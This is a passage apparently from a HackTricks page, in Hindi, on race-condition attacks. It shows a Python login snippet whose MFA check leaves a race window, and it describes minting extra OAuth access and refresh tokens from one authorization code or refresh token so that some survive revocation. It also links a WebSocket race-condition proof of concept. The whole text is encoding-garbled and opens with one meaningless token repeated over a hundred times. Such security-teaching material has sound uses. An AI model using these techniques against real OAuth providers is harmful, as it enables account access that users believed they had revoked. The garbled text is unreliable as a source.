‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-‡§Ö‡§Ç‡§§‡§∞‡•ç‡§ó‡§§ ‡§Ö‡§Ç‡§§-
```python
session['userid'] = user.userid
if user.mfa_enabled:
session['enforce_mfa'] = True
# generate and send MFA code to user
# redirect browser to MFA code entry form
```
### OAuth2 ‡§∂‡§æ‡§∂‡•ç‡§µ‡§§ ‡§∏‡•ç‡§•‡§ø‡§∞‡§§‡§æ

‡§ï‡§à [**OAUth ‡§™‡•ç‡§∞‡§¶‡§æ‡§§‡§æ‡§è‡§Ç**](https://en.wikipedia.org/wiki/List\_of\_OAuth\_providers) ‡§π‡•à‡§Ç‡•§ ‡§Ø‡•á ‡§∏‡•á‡§µ‡§æ‡§è‡§Ç ‡§Ü‡§™‡§ï‡•ã ‡§è‡§ï ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§¨‡§®‡§æ‡§®‡•á ‡§î‡§∞ ‡§™‡•ç‡§∞‡§¶‡§æ‡§§‡§æ ‡§¶‡•ç‡§µ‡§æ‡§∞‡§æ ‡§™‡§Ç‡§ú‡•Ä‡§ï‡•É‡§§ ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ‡§ì‡§Ç ‡§ï‡•ã ‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡§ø‡§§ ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§Ç‡§ó‡•Ä‡•§ ‡§á‡§∏‡§ï‡•á ‡§≤‡§ø‡§è **‡§ó‡•ç‡§∞‡§æ‡§π‡§ï** ‡§ï‡•ã ‡§Ö‡§™‡§®‡•á ‡§°‡•á‡§ü‡§æ ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§®‡•á ‡§ï‡•Ä ‡§Ü‡§µ‡§∂‡•ç‡§Ø‡§ï‡§§‡§æ ‡§π‡•ã‡§ó‡•Ä‡•§\
‡§§‡•ã, ‡§Ø‡§π‡§æ‡§Å ‡§§‡§ï ‡§∏‡§ø‡§∞‡•ç‡§´ ‡§è‡§ï ‡§∏‡§æ‡§Æ‡§æ‡§®‡•ç‡§Ø ‡§≤‡•â‡§ó‡§ø‡§® ‡§ó‡•Ç‡§ó‡§≤/‡§≤‡§ø‡§Ç‡§ï‡•ç‡§°‡§á‡§®/‡§ó‡§ø‡§•‡§¨... ‡§ú‡§π‡§æ‡§Ç ‡§Ü‡§™‡§ï‡•ã ‡§è‡§ï ‡§™‡•É‡§∑‡•ç‡§† ‡§™‡§∞ ‡§™‡•ç‡§∞‡•ã‡§Æ‡•ç‡§™‡•ç‡§ü ‡§ï‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§§‡§æ ‡§π‡•à ‡§ú‡§ø‡§∏‡§Æ‡•á‡§Ç ‡§≤‡§ø‡§ñ‡§æ ‡§π‡•ã‡§§‡§æ ‡§π‡•à: "_‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® \<InsertCoolName> ‡§Ü‡§™‡§ï‡•Ä ‡§ú‡§æ‡§®‡§ï‡§æ‡§∞‡•Ä ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡§æ ‡§π‡•à, ‡§ï‡•ç‡§Ø‡§æ ‡§Ü‡§™ ‡§á‡§∏‡•á ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç?_"

#### `authorization_code` ‡§Æ‡•á‡§Ç ‡§∞‡•á‡§∏ ‡§ï‡§Ç‡§°‡•Ä‡§∂‡§®

**‡§∏‡§Æ‡§∏‡•ç‡§Ø‡§æ** ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§π‡•ã‡§§‡•Ä ‡§π‡•à ‡§ú‡§¨ ‡§Ü‡§™ ‡§á‡§∏‡•á **‡§∏‡•ç‡§µ‡•Ä‡§ï‡§æ‡§∞ ‡§ï‡§∞‡§§‡•á ‡§π‡•à‡§Ç** ‡§î‡§∞ ‡§∏‡•ç‡§µ‡§ö‡§æ‡§≤‡§ø‡§§ ‡§∞‡•Ç‡§™ ‡§∏‡•á ‡§è‡§ï **`authorization_code`** ‡§ï‡•ã ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§ï‡•ã ‡§≠‡•á‡§ú ‡§¶‡•á‡§§‡§æ ‡§π‡•à‡•§ ‡§´‡§ø‡§∞, ‡§Ø‡§π **‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® OAUth ‡§∏‡•á‡§µ‡§æ ‡§™‡•ç‡§∞‡§¶‡§æ‡§§‡§æ ‡§Æ‡•á‡§Ç ‡§∞‡•á‡§∏ ‡§ï‡§Ç‡§°‡•Ä‡§∂‡§® ‡§ï‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§§‡§æ ‡§π‡•à ‡§§‡§æ‡§ï‡§ø ‡§Ü‡§™‡§ï‡•á ‡§ñ‡§æ‡§§‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§è‡§ï ‡§∏‡•á ‡§Ö‡§ß‡§ø‡§ï AT/RT** (_‡§™‡•ç‡§∞‡§Æ‡§æ‡§£‡•Ä‡§ï‡§∞‡§£ ‡§ü‡•ã‡§ï‡§®/‡§∞‡§ø‡§´‡•ç‡§∞‡•á‡§∂ ‡§ü‡•ã‡§ï‡§®_) ‡§ï‡•ã **`authorization_code`** ‡§∏‡•á ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞ ‡§∏‡§ï‡•á‡•§ ‡§Æ‡•Å‡§ñ‡•ç‡§Ø ‡§∞‡•Ç‡§™ ‡§∏‡•á, ‡§Ø‡§π ‡§Ü‡§™‡§ï‡•á ‡§°‡•á‡§ü‡§æ ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§®‡•á ‡§ï‡•á ‡§¨‡§æ‡§¶ ‡§Ø‡§π ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡•á‡§ó‡§æ ‡§ï‡§ø ‡§Ü‡§™ ‡§ï‡§à ‡§ñ‡§æ‡§§‡•á ‡§¨‡§®‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç‡•§ ‡§´‡§ø‡§∞, ‡§Ö‡§ó‡§∞ ‡§Ü‡§™ **‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§ï‡•ã ‡§Ö‡§™‡§®‡•á ‡§°‡•á‡§ü‡§æ ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§¶‡•á‡§®‡§æ ‡§¨‡§Ç‡§¶ ‡§ï‡§∞ ‡§¶‡•á‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡•ã ‡§è‡§ï ‡§ú‡•ã‡§°‡§º‡§æ AT/RT ‡§π‡§ü‡§æ ‡§¶‡§ø‡§Ø‡§æ ‡§ú‡§æ‡§è‡§ó‡§æ, ‡§≤‡•á‡§ï‡§ø‡§® ‡§Ö‡§®‡•ç‡§Ø ‡§µ‡§æ‡§≤‡§ø‡§° ‡§∞‡§π‡•á‡§Ç‡§ó‡•á**‡•§

#### `Refresh Token` ‡§Æ‡•á‡§Ç ‡§∞‡•á‡§∏ ‡§ï‡§Ç‡§°‡•Ä‡§∂‡§®

‡§è‡§ï ‡§¨‡§æ‡§∞ ‡§ú‡§¨ ‡§Ü‡§™‡§®‡•á **‡§è‡§ï ‡§µ‡§æ‡§≤‡§ø‡§° RT ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§ø‡§Ø‡§æ ‡§π‡•à** ‡§§‡•ã ‡§Ü‡§™ ‡§á‡§∏‡•á ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§ï‡§à AT/RT ‡§â‡§§‡•ç‡§™‡§®‡•ç‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•Ä ‡§ï‡•ã‡§∂‡§ø‡§∂ ‡§ï‡§∞ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç ‡§î‡§∞ **‡§Ø‡§¶‡§ø ‡§â‡§™‡§Ø‡•ã‡§ó‡§ï‡§∞‡•ç‡§§‡§æ ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó‡•Ä ‡§è‡§™‡•ç‡§≤‡§ø‡§ï‡•á‡§∂‡§® ‡§ï‡•á ‡§≤‡§ø‡§è ‡§Ö‡§™‡§®‡•á ‡§°‡•á‡§ü‡§æ ‡§§‡§ï ‡§™‡§π‡•Å‡§Ç‡§ö‡§®‡•á ‡§ï‡•Ä ‡§Ö‡§®‡•Å‡§Æ‡§§‡§ø ‡§∞‡§¶‡•ç‡§¶ ‡§ï‡§∞ ‡§¶‡•á‡§§‡§æ ‡§π‡•à ‡§§‡•ã ‡§ï‡§à RTs ‡§Ö‡§≠‡•Ä ‡§≠‡•Ä ‡§µ‡§æ‡§≤‡§ø‡§° ‡§∞‡§π‡•á‡§Ç‡§ó‡•á**‡•§

## **‡§µ‡•á‡§¨‡§∏‡•â‡§ï‡•á‡§ü ‡§Æ‡•á‡§Ç RC**

[**WS\_RaceCondition\_PoC**](https://github.com/redrays-io/WS\_RaceCondition\_PoC) ‡§Æ‡•á‡§Ç ‡§Ü‡§™ ‡§è‡§ï PoC ‡§ú‡§æ‡§µ‡§æ ‡§Æ‡•á‡§Ç ‡§µ‡•á‡§¨‡§∏‡•â‡§ï‡•á‡§ü ‡§∏‡§Ç‡§¶‡•á‡§∂ ‡§≠‡•á‡§ú‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è **‡§™‡•à‡§∞‡§≤‡§≤** ‡§Æ‡•á‡§Ç ‡§¶‡•Å‡§∞‡•Å‡§™‡§Ø‡•ã‡§ó ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§≤‡§ø‡§è ‡§™‡§æ ‡§∏‡§ï‡§§‡•á ‡§π‡•à‡§Ç **‡§µ‡•á‡§¨ ‡§∏‡•â‡§ï‡•á‡§ü ‡§Æ‡•á‡§Ç ‡§≠‡•Ä ‡§∞‡•á‡§∏ ‡§ï‡§Ç‡§°‡•Ä‡§∂‡§®**‡•§

## ‡§∏‡§Ç‡§¶‡§∞‡•ç‡§≠

* [https://hackerone.com/reports/759247](https://hackerone.com/reports/759247)
* [https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html](https://pandaonair.com/2020/06/11/race-conditions-exploring-the-possibilities.html)
* [https://hackerone.com/reports/55140](https://hackerone.com/reports/55140)
* [https://portswigger.net/research/smashing-the-state-machine](https://portswigger.net/research/smashing-the-state-machine)
* [https://portswigger.net/web-security/race-conditions](https://portswigger.net/web-security/race-conditions)

<details>

<summary><strong>‡§ú‡§æ‡§®‡•á‡§Ç AWS ‡§π‡•à‡§ï‡§ø‡§Ç‡§ó ‡§ï‡•ã ‡§∂‡•Ç‡§®‡•ç‡§Ø ‡§∏‡•á ‡§π‡•Ä‡§∞‡•ã ‡§§‡§ï</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ‡§ï‡•á ‡§∏‡§æ‡§•!</strong></summary>

HackTricks ‡§ï‡§æ ‡§∏‡§Æ‡§∞‡•ç‡§•‡§® ‡§ï‡§∞‡§®‡•á ‡§ï‡•á ‡§Ö‡§®‡•ç‡§Ø ‡§§‡§∞‡•Ä‡§ï‡•á:

* ‡§Ø‡§¶‡§ø ‡§Ü‡§™ ‡§Ö‡§™‡§®‡•Ä ‡§ï‡§Ç‡§™‡§®‡•Ä ‡§ï‡§æ ‡§µ‡§ø‡§ú‡•ç‡§û‡§æ‡§™‡§® **HackTricks ‡§Æ‡•á‡§Ç ‡§¶‡•á‡§ñ‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç** ‡§Ø‡§æ **HackTricks ‡§ï‡•ã PDF ‡§Æ‡•á‡§Ç ‡§°‡§æ‡§â‡§®‡§≤‡•ã‡§°** ‡§ï‡§∞‡§®‡§æ ‡§ö‡§æ‡§π‡§§‡•á ‡§π‡•à‡§Ç ‡§§‡•ã [**‡§∏‡§¨‡•ç‡§∏‡§ï‡•ç‡§∞‡§ø‡§™‡•ç‡§∂‡§® ‡§™‡•ç‡§≤‡§æ‡§®‡•ç‡§∏**](https://github.com/sponsors/carlospolop) ‡§¶‡•á‡§ñ‡•á‡§Ç!
* [**‡§Ü‡§ß‡§ø‡§ï‡§æ‡§∞‡§ø‡§ï PEASS & HackTricks ‡§∏‡•ç‡§µ‡•à‡§ó**](https://peass.creator-spring.com) ‡§™‡•ç‡§∞‡§æ‡§™‡•ç‡§§ ‡§ï‡§∞‡•á‡§Ç
